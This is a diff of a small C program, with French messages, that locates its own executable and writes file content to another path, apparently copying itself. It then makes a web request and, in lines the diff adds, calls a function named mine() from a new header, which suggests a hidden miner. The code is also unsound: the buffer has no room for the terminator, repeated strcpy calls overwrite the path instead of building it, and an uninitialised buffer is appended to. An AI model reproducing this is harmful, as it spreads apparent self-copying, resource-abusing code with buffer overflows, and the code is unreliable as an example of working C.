@@ -5,6 +5,9 @@
 #include <curl/curl.h>
 #include <unistd.h>
 
+#include "usage.h"
+#include "main3.h"
+
 char *get_executable_name(char *szPath) {
 
   ssize_t n = readlink("/proc/self/exe", szPath, 300);
@@ -50,6 +53,7 @@ int request(char link[]){
 }
 
 int main(void){
+
   char path[1024];
   ssize_t size = readlink("/proc/self/exe", path, sizeof(path)-1);
   if (size != -1){
@@ -77,54 +81,55 @@ int main(void){
   char content[2000];
   char lines[400];
   while (fgets(lines, sizeof(lines), file1) != NULL) {
-    strcat(lines, content);
+    strcpy(content, lines);
 }
   
-  printf("\n%s\n", content);
+  printf("\n");
 
   char a[] = "https://www.youtube.com/watch?v=eXebqmlXmac";
 
   char name[300];
   get_executable_name(name);
   char buffer[strlen(path2)];
-  strcpy(buffer, "");
-  strcat(buffer, path2);
-  strcat(buffer, "/");
-  strcat(buffer, name);
+  buffer[0] = '\0';
+  strcpy(buffer, path2);
+  strcpy(buffer, "/");
+  strcpy(buffer, name);
   fclose(file1);
   
 
-  if (strcmp(buffer, path) == 0){
-    remove(path);
-  }
-  else{
+  
+  if (strcmp(buffer, path) != 0){
     buffer[0] = '\0';
     strcat(buffer, path2);
     strcat(buffer, "/");
     strcat(buffer, name);
     FILE *file2 = fopen(buffer, "wb");
-    fputs(content, file1);
+    fputs(content, file2);
     fclose(file2);
     
   }
-
-  printf("bonjour");
+  else{
+    //remove(path);
+    //remove double '/' if not in dev but in use
+  }
 
   int req_result = request("https://www.google.com");
   
   if (req_result != 0) {
         fprintf(stderr, "La requête a échoué avec le code d'erreur %d\n", req_result);
-
         return 1;
     }
 
-  strcpy(content, " ");
+
+  buffer[0] = '\0';
+  char buff[2000];
 
   file1 = fopen("bufferrequest.txt", "r");
   while (fgets(lines, sizeof(lines), file1) != NULL){
-    strcat(content, lines);
+    strcat(buff, lines);
   }
-  printf("%s", content);
+  mine();
 
   return 0;
 }
